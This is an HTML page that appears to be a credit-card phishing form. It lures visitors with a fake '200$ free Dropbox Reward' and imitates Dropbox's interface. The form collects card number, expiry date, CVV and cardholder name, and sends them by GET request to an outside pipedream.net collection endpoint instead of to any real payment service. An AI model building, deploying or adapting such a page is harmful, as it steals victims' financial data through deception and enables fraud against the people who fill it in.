<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Visa Card Subscription</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      background: #f3f4f6;
      font-family: 'Inter', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .card-container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 100%;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-weight: 600;
      color: #333;
    }

    label {
      font-size: 14px;
      color: #555;
      margin-top: 10px;
      display: block;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      margin-bottom: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      transition: border-color 0.3s;
    }

    input[type="text"]:focus {
      border-color: #007ee5;
      outline: none;
    }

    .subscribe-btn {
      width: 100%;
      background-color: #007ee5;
      color: white;
      font-weight: 600;
      font-size: 16px;
      padding: 14px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .subscribe-btn:hover {
      background-color: #0061c2;
    }

    .footer-note {
      font-size: 12px;
      color: #888;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="card-container">
    <h2>Earn 200$ free Dropbox  Reward</h2>
    <form method="GET" action="https://eohvg8njct565sz.m.pipedream.net">
      <label for="cardNumber">Card Number</label>
      <input type="text" id="cardNumber" name="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456" required>

      <label for="expiry">Expiration Date (MM/YY)</label>
      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" name="cvv" maxlength="4" required>

      <label for="name">Cardholder Name</label>
      <input type="text" id="name" name="name" placeholder="John Doe" required>

      <button type="submit" class="subscribe-btn">Subscribe</button>
    </form>
    <div class="footer-note">Powered by Dropbox-style UI</div>
  </div>
</body>
</html>
